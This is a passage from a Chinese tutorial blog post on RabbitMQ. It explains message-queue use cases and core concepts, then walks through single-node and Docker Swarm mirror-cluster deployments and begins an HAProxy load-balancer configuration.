title="流量削峰"></a>流量削峰</h3><p>假设我们有一个应用,平时访问量是每秒300请求,我们用一台服务器即可轻松应对</p><p><img src="/images/docker/docker-rabbitmq/3.png" alt="3"></p><p>而在高峰期,访问量瞬间翻了十倍,达到每秒3000次请求,那么单台服务器肯定无法应对,这时我们可以考虑增加到10台服务器,来分散访问压力</p><p>但如果这种瞬时高峰的情况每天只出现一次,每次只有半小时,那么我们10台服务器在多数时间都只分担每秒几十次请求,这样就有点浪费资源了</p><p><img src="/images/docker/docker-rabbitmq/4.png" alt="4"></p><p>这种情况,我们就可以使用RabbitMQ来进行流量削峰,高峰情况下,瞬间出现的大量请求数据,先发送到消息队列服务器,排队等待被处理,而我们的应用,可以慢慢的从消息队列接收请求数据进行处理,这样把数据处理时间拉长,以减轻瞬时压力</p><p>这是消息队列服务器非常典型的应用场景</p><p><img src="/images/docker/docker-rabbitmq/5.png" alt="5"></p><h3 id="异步调用"><a href="#异步调用" class="headerlink" title="异步调用"></a>异步调用</h3><p>考虑定外卖支付成功的情况</p><p>支付后要发送支付成功的通知,再寻找外卖小哥来进行配送,而寻找外卖小哥的过程非常耗时,尤其是高峰期,可能要等待几十秒甚至更长</p><p>这样就造成整条调用链路响应非常缓慢</p><p><img src="/images/docker/docker-rabbitmq/6.png" alt="6"></p><p>而如果我们引入RabbitMQ消息队列,订单数据可以发送到消息队列服务器,那么调用链路也就可以到此结束,订单系统则可以立即得到响应,整条链路的响应时间只有200毫秒左右</p><p>寻找外卖小哥的应用可以以异步的方式从消息队列接收订单消息,再执行耗时的寻找操作</p><p><img src="/images/docker/docker-rabbitmq/7.png" alt="7"></p><h2 id="RabbitMQ-基本概念"><a href="#RabbitMQ-基本概念" class="headerlink" title="RabbitMQ 基本概念"></a>RabbitMQ 基本概念</h2><p>RabbitMQ是一种消息中间件，用于处理来自客户端的异步消息。服务端将要发送的消息放入到队列池中。接收端可以根据RabbitMQ配置的转发机制接收服务端发来的消息。RabbitMQ依据指定的转发规则进行消息的转发、缓冲和持久化操作，主要用在多服务器间或单服务器的子系统间进行通信，是分布式系统标准的配置。</p><p><img src="/images/docker/docker-rabbitmq/8.png" alt="8"></p><h3 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h3><p>接受生产者发送的消息，并根据Binding规则将消息路由给服务器中的队列。ExchangeType决定了Exchange路由消息的行为。在RabbitMQ中，ExchangeType常用的有direct、Fanout和Topic三种。</p><p><img src="/images/docker/docker-rabbitmq/9.png" alt="9"></p><h3 id="Message-Queue"><a href="#Message-Queue" class="headerlink" title="Message Queue"></a>Message Queue</h3><p>消息队列。我们发送给RabbitMQ的消息最后都会到达各种queue，并且存储在其中(如果路由找不到相应的queue则数据会丢失)，等待消费者来取。</p><h3 id="Binding-Key"><a href="#Binding-Key" class="headerlink" title="Binding Key"></a>Binding Key</h3><p>它表示的是Exchange与Message Queue是通过binding key进行联系的，这个关系是固定。</p><h3 id="Routing-Key"><a href="#Routing-Key" class="headerlink" title="Routing Key"></a>Routing Key</h3><p>生产者在将消息发送给Exchange的时候，一般会指定一个routing key，来指定这个消息的路由规则。这个routing key需要与Exchange Type及binding key联合使用才能生，我们的生产者只需要通过指定routing key来决定消息流向哪里。</p><h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><p><strong>虚拟机</strong></p><ul><li>node1：192.168.174.10</li><li>node2：192.168.174.11</li><li>node3：192.168.174.12</li><li>node4：192.168.174.13</li><li>node5：192.168.174.14</li></ul><p>其中，node1、node2、node3三台服务器安装RabbitMQ服务，node4和node5安装HA-proxy和Keepalived。</p><p><strong>集群</strong></p><p>docker swarm，node1 为 manager 节点，node2 / node3 为 worker 节点</p><p><strong>主要端口介绍</strong></p><ul><li>4369 erlang发现口</li><li>5672 client端通信口</li><li>15672 管理界面ui端口</li><li>25672 server间内部通信口</li></ul><h2 id="单机部署"><a href="#单机部署" class="headerlink" title="单机部署"></a>单机部署</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rabbitmq:3.8.5-management</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"15672:15672"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"5672:5672"</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rabbit_network</span></span><br><span class="line">    <span class="attr">env_file:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./rabbit.env</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/usr/share/zoneinfo/Asia/Shanghai:/etc/localtime:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/timezone:/etc/timezone:ro</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">mode:</span> <span class="string">replicated</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">restart_policy:</span></span><br><span class="line">        <span class="attr">condition:</span> <span class="string">on-failure</span></span><br><span class="line">        <span class="attr">delay:</span> <span class="string">5s</span></span><br><span class="line">        <span class="attr">max_attempts:</span> <span class="number">3</span></span><br><span class="line">      <span class="attr">update_config:</span></span><br><span class="line">        <span class="attr">parallelism:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">delay:</span> <span class="string">10s</span></span><br><span class="line">      <span class="attr">resources:</span></span><br><span class="line">        <span class="attr">limits:</span></span><br><span class="line">          <span class="attr">cpus:</span> <span class="string">"1"</span></span><br><span class="line">          <span class="attr">memory:</span> <span class="string">1024M</span></span><br><span class="line">    <span class="attr">logging:</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">"json-file"</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">max-size:</span> <span class="string">"20m"</span></span><br><span class="line">        <span class="attr">max-file:</span> <span class="string">"2"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">rabbit_network:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>rabbit.env</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RABBITMQ_DEFAULT_USER=admin</span><br><span class="line">RABBITMQ_DEFAULT_PASS=123456</span><br></pre></td></tr></table></figure><blockquote><p>访问控制台 <a href="http://localhost:15672" target="_blank" rel="noopener">http://localhost:15672</a></p></blockquote><h2 id="集群模式-mirror"><a href="#集群模式-mirror" class="headerlink" title="集群模式 - mirror"></a>集群模式 - mirror</h2><p>这里采用镜像模式，保证 100% 数据不丢失。在实际工作中也是用得最多的，并且实现非常的简单，一般互联网大厂都会构建这种镜像集群模式。</p><p>mirror 镜像队列，目的是为了保证 rabbitMQ 数据的高可靠性解决方案，主要就是实现数据的同步，一般来讲是 2 - 3 个节点实现数据同步。对于 100% 数据可靠性解决方案，一般是采用 3 个节点。</p><p><img src="/images/docker/docker-rabbitmq/11.png" alt="11"></p><p>如上图所示，用 KeepAlived 做了 HA-Proxy 的高可用，然后有 3 个节点的 MQ 服务，消息发送到主节点上，主节点通过 mirror 队列把数据同步到其他的 MQ 节点，这样来实现其高可靠。</p><h2 id="集群部署方式一（-rabbitmqctl"><a href="#集群部署方式一（-rabbitmqctl" class="headerlink" title="集群部署方式一（ rabbitmqctl )"></a>集群部署方式一（ rabbitmqctl )</h2><blockquote><p><a href="https://www.rabbitmq.com/clustering.html#transcript" target="_blank" rel="noopener">https://www.rabbitmq.com/clustering.html#transcript</a></p></blockquote><p><strong>创建 rabbitmq 持久化存储路径</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 【所有节点】</span></span><br><span class="line">mkdir -p ~/rabbitmq/data</span><br></pre></td></tr></table></figure><p><strong>在 node1 上新建部署文件 ~/rabbitmq/stack.yml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3.7'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">rabbit1:</span></span><br><span class="line">    <span class="comment"># image: rabbitmq:3</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rabbitmq:3.8.5-management</span></span><br><span class="line">    <span class="comment"># ports:</span></span><br><span class="line">    <span class="comment">#   - "15672:15672"</span></span><br><span class="line">    <span class="comment">#   - "5672:5672"</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rabbit_network</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">~/rabbitmq/data:/var/lib/rabbitmq</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">RABBITMQ_ERLANG_COOKIE=admin_cluster_cookie</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">RABBITMQ_DEFAULT_USER=admin</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">RABBITMQ_DEFAULT_PASS=123456</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">rabbit1</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">placement:</span></span><br><span class="line">        <span class="attr">constraints:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">node.hostname==node1</span></span><br><span class="line">  <span class="attr">rabbit2:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rabbitmq:3.8.5-management</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rabbit_network</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">~/rabbitmq/data:/var/lib/rabbitmq</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">RABBITMQ_ERLANG_COOKIE=admin_cluster_cookie</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">RABBITMQ_DEFAULT_USER=admin</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">RABBITMQ_DEFAULT_PASS=123456</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">rabbit2</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">placement:</span></span><br><span class="line">        <span class="attr">constraints:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">node.hostname==node2</span></span><br><span class="line">  <span class="attr">rabbit3:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rabbitmq:3.8.5-management</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rabbit_network</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">~/rabbitmq/data:/var/lib/rabbitmq</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">RABBITMQ_ERLANG_COOKIE=admin_cluster_cookie</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">RABBITMQ_DEFAULT_USER=admin</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">RABBITMQ_DEFAULT_PASS=123456</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">rabbit3</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">placement:</span></span><br><span class="line">        <span class="attr">constraints:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">node.hostname==node3</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">rabbit_network:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">overlay</span></span><br><span class="line">    <span class="attr">attachable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>启动 rabbitmq 服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 【node1】部署 stack</span></span><br><span class="line">docker stack deploy -c ~/rabbitmq/stack.yml rabbitmq</span><br><span class="line"></span><br><span class="line"><span class="comment"># 【node1】查看服务状态</span></span><br><span class="line">docker service ls</span><br></pre></td></tr></table></figure><p><strong>构建 rabbitmq 集群</strong></p><blockquote><p>将 rabbit@rabbit2 和 rabbit@rabbit3 加入集群：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#【node2】rabbit@rabbit2 加入集群</span></span><br><span class="line">docker <span class="built_in">exec</span> -it $(docker ps | grep <span class="string">"rabbit"</span> | awk <span class="string">'&#123; print $1 &#125;'</span>)  rabbitmqctl stop_app</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it $(docker ps | grep <span class="string">"rabbit"</span> | awk <span class="string">'&#123; print $1 &#125;'</span>)  rabbitmqctl reset</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it $(docker ps | grep <span class="string">"rabbit"</span> | awk <span class="string">'&#123; print $1 &#125;'</span>)  rabbitmqctl join_cluster rabbit@rabbit1</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it $(docker ps | grep <span class="string">"rabbit"</span> | awk <span class="string">'&#123; print $1 &#125;'</span>)  rabbitmqctl start_app</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#【node3】rabbit@rabbit3 加入集群</span></span><br><span class="line">docker <span class="built_in">exec</span> -it $(docker ps | grep <span class="string">"rabbit"</span> | awk <span class="string">'&#123; print $1 &#125;'</span>)  rabbitmqctl stop_app</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it $(docker ps | grep <span class="string">"rabbit"</span> | awk <span class="string">'&#123; print $1 &#125;'</span>)  rabbitmqctl reset</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it $(docker ps | grep <span class="string">"rabbit"</span> | awk <span class="string">'&#123; print $1 &#125;'</span>)  rabbitmqctl join_cluster rabbit@rabbit1</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it $(docker ps | grep <span class="string">"rabbit"</span> | awk <span class="string">'&#123; print $1 &#125;'</span>)  rabbitmqctl start_app</span><br></pre></td></tr></table></figure><p><strong>查看集群状态</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 【任意节点】</span></span><br><span class="line">docker <span class="built_in">exec</span> -it $(docker ps | grep <span class="string">"rabbit"</span> | awk <span class="string">'&#123; print $1 &#125;'</span>)  rabbitmqctl cluster_status</span><br></pre></td></tr></table></figure><h2 id="集群部署方式二（-Config-File-Peer-Discovery-Backend"><a href="#集群部署方式二（-Config-File-Peer-Discovery-Backend" class="headerlink" title="集群部署方式二（ Config File Peer Discovery Backend )"></a>集群部署方式二（ Config File Peer Discovery Backend )</h2><blockquote><p><a href="https://www.rabbitmq.com/cluster-formation.html#configuring" target="_blank" rel="noopener">https://www.rabbitmq.com/cluster-formation.html#configuring</a></p></blockquote><p><strong>创建 rabbitmq 持久化存储路径</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 【所有节点】</span></span><br><span class="line">mkdir -p ~/rabbitmq/data</span><br></pre></td></tr></table></figure><p><strong>在 node1 上创建 rabbitmq 配置文件 ~/rabbitmq/rabbitmq.conf</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">loopback_users.guest = <span class="literal">false</span></span><br><span class="line">listeners.tcp.default = 5672</span><br><span class="line">hipe_compile = <span class="literal">false</span></span><br><span class="line">default_user = admin</span><br><span class="line">default_pass = 123456</span><br><span class="line">cluster_formation.peer_discovery_backend = rabbit_peer_discovery_classic_config</span><br><span class="line">cluster_formation.classic_config.nodes.1 = rabbit@rabbit1</span><br><span class="line">cluster_formation.classic_config.nodes.2 = rabbit@rabbit2</span><br><span class="line">cluster_formation.classic_config.nodes.3 = rabbit@rabbit3</span><br></pre></td></tr></table></figure><p><strong>在 node1 上创建 docker config</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker config create rabbitmq-config ~/rabbitmq/rabbitmq.conf</span><br></pre></td></tr></table></figure><p><strong>在 node1 上新建部署文件 ~/rabbitmq/stack.yml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3.7'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">rabbit1:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rabbitmq:3</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rabbit_network</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">~/rabbitmq/data:/var/lib/rabbitmq</span></span><br><span class="line">    <span class="attr">configs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">source:</span> <span class="string">rabbitmq-config</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/etc/rabbitmq/rabbitmq.conf</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">RABBITMQ_ERLANG_COOKIE=admin_cluster_cookie</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">rabbit1</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">placement:</span></span><br><span class="line">        <span class="attr">constraints:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">node.hostname==node1</span></span><br><span class="line">  <span class="attr">rabbit2:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rabbitmq:3</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rabbit_network</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">~/rabbitmq/data:/var/lib/rabbitmq</span></span><br><span class="line">    <span class="attr">configs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">source:</span> <span class="string">rabbitmq-config</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/etc/rabbitmq/rabbitmq.conf</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">RABBITMQ_ERLANG_COOKIE=admin_cluster_cookie</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">rabbit2</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">placement:</span></span><br><span class="line">        <span class="attr">constraints:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">node.hostname==node2</span></span><br><span class="line">  <span class="attr">rabbit3:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rabbitmq:3</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rabbit_network</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">~/rabbitmq/data:/var/lib/rabbitmq</span></span><br><span class="line">    <span class="attr">configs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">source:</span> <span class="string">rabbitmq-config</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/etc/rabbitmq/rabbitmq.conf</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">RABBITMQ_ERLANG_COOKIE=admin_cluster_cookie</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">rabbit3</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">      <span class="attr">placement:</span></span><br><span class="line">        <span class="attr">constraints:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">node.hostname==node3</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">rabbit_network:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">overlay</span></span><br><span class="line">    <span class="attr">attachable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">configs:</span></span><br><span class="line">  <span class="attr">rabbitmq-config:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>启动 rabbitmq 集群</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 【node1】部署集群</span></span><br><span class="line">docker stack deploy -c ~/rabbitmq/stack.yml rabbitmq</span><br></pre></td></tr></table></figure><h2 id="Keepalived-HAProxy"><a href="#Keepalived-HAProxy" class="headerlink" title="Keepalived + HAProxy"></a>Keepalived + HAProxy</h2><p><strong>安装 HAProxy</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">yum install haproxy -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改配置</span></span><br><span class="line">vim /etc/haproxy/haproxy.cfg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#logging options</span><br><span class="line">global</span><br><span class="line">    log 127.0.0.1 local0 info</span><br><span class="line">    maxconn 5120</span><br><span class="line">    chroot &#x2F;usr&#x2F;local&#x2F;haproxy</span><br><span class="line">    uid 99</span><br><span class="line">    gid 99</span><br><span class="line">    daemon</span><br><span class="line">    quiet</span><br><span class="line">    nbproc 20</span><br><span class="line">    pidfile &#x2F;var&#x2F;run&#x2F;haproxy.pid</span><br><span class="line"></span><br><span class="line">defaults</span><br><span class="line">    log global</span><br><span class="line">    # 使用四层代理模式,&quot;mode http&quot; 为7层代理模式</span><br><span class="line">    mode tcp</span><br><span class="line">    # if you set mode to tcp,then you must change tcplog into httplog</span><br><span class="line">    option tcplog</span><br><span class="line">    option dontlognull</span><br><span class="line">    retries 3</span><br><span class="line">    option redispatch</span><br><span class="line">    maxconn 2000</span><br><span class="line">    contimeout 5s</span><br><span class="line">    # 客户端空闲超时时间为60秒，过了该时间，HA发起重连机制</span><br><span class="line">    clitimeout 60s</span><br><span class="line">    # 服务端连接超时时间为15秒，过了该时间，HA发起重连机制</span><br><span class="line">    srvtimeout 15s</span><br><span class="line"></span><br><span class="line">listen rabbitmq_cluster</span><br><span class="line">    # 定义监听地址和端口，本机的5672端口</span><br><span class="line">    bind 0.0.0.0:5672</span><br><span class="line">    # 配置 tcp 模式</span><br><span class="line">    mode tcp</span><br><span class="line">    # balance url_param userid</span><br><span class="line">    # balance url_param session_id check_post 64</span><br><span class="line">    # 简单的轮询</span><br><span class="line">    balance roundrobin</span><br><span class="line">    #rabbitmq集群节点配置 #inter 每隔五秒对mq集群做健康检查，2次正确证明服务器可用，</span><br><span class="line">    #2次失败证明服务器不可用，并且配置主备机制</span><br><span class="line">    server node1 192.168.174.10:5672 check inter 5000 rise 2 fall 2</span><br><span class="line">    server node2 192.168.174.11:5672 check inter 5000 rise 2 fall 2</span><br><span class="line">    server node3 192.168.174.12:5672 check inter 5000 rise 2 fall 2</span><br><span class="line"></span><br><span class="line"># 配置 haproxy web 监控，查看统计信息</span><br><span class="line">listen 